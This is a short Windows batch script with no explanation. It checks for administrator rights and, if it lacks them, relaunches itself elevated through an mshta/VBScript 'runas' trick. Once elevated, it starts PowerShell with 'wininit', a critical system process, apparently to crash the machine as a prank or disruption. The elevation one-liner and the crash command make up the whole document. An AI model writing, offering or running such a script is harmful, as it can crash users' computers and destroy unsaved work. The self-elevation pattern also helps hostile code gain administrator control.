@echo off
set a=1
net session >nul 2>&1 || %1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit

start powershell wininit

pause